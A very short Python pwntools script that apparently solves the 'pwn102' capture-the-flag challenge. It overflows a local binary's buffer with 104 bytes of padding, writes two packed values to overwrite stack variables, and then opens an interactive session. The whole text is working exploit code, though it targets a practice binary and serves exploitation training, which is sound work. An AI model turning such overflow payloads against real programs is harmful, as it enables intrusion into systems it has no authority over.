from pwn import *

p = process("./pwn102.pwn102")

payload = b'A'*104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

p.sendline(payload)
p.recv()

p.interactive()